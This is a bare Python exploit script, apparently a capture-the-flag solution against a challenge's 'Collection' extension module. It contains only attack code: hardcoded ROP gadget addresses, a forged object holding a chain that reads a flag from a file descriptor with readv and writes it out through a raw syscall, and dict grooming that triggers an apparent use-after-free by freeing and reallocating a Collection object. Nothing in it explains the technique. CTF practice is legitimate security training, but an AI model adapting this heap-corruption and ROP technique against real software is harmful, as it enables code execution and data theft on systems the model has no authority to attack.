def p64(x):
    return x.to_bytes(8, 'little')

leave = 0x467123
pop_rax = 0x420f7b
pop_rdi = 0x421612
pop_rsi = 0x42110e
pop_rdx = 0x4026c1
readv_plt = 0x4208b6
write_plt = 0x9b3d18
syscall = 0x49d6d4

flag = ''
iovec = p64(id(flag) + 0x30) + p64(0x100)

fake_obj = b''
fake_obj += p64(0)
fake_obj += p64(pop_rdi) + p64(1023)
fake_obj += p64(pop_rsi) + p64(id(iovec) + 0x20)
fake_obj += p64(pop_rdx) + p64(1)
fake_obj += p64(readv_plt)

fake_obj += p64(pop_rdi) + p64(1)
fake_obj += p64(pop_rsi) + p64(id(flag) + 0x30)
fake_obj += p64(pop_rdx) + p64(0x100)
fake_obj += p64(pop_rax) + p64(1)
fake_obj += p64(syscall)
fake_obj += p64(0xdeadbeef)
fake_obj += p64(leave)
print(hex(id(fake_obj)))

payload = {}
for i in range(0x21):
    payload['%d' % i] = i
payload['%d' % 0x21] = id(fake_obj) + 0x20
for i in range(0x1e, 0x20):
    del payload['%d' % i]

a = Collection.Collection({'a': 1})
b = Collection.Collection({'b': 2})
del a
a = Collection.Collection(payload)
b.get('')
END_OF_PWN
